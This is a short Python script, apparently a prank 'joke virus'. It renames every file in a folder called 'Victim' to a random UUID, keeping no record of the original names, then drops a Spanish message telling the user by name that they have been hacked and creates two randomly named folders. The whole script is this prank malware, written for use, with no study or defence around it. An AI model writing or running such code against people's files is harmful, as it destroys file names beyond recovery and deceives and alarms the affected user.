import uuid
import os, sys
from getpass import getuser

ruta = os.getcwd()
user = getuser()
os.chdir('Victim/')
files = os.listdir()
for f in files:
        name = uuid.uuid4()
        name = str(name)
        print(f)
        os.rename(f, name)

for i in range(1,2):
    name = uuid.uuid4()
    name = str(name)
    user = getuser()
    archivo = open(f"{name}.txt", "w")
    archivo.write(f"Hola {user} has sido Hackeado con un virus Joke")
    archivo.close()
    i +=1

for i in range(1,3):
    name = uuid.uuid4()
    os.makedirs(f"{name}")
    i +=1